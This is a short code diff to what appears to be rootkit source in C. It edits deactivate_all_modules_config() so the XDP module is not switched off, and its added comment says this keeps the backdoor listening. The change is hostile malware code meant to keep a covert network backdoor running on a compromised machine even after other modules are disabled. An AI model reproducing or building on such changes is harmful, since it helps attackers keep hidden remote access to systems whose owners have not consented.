@@ -123,7 +123,8 @@ int activate_all_modules_config(){
 
 int deactivate_all_modules_config(){
     //XDP
-    module_config.xdp_module.all = OFF;
+    //This is not deactivated, since it is needed for backdoor to keep listening
+    //module_config.xdp_module.all = OFF;
 
     //SCHED
     module_config.sched_module.all = OFF; 
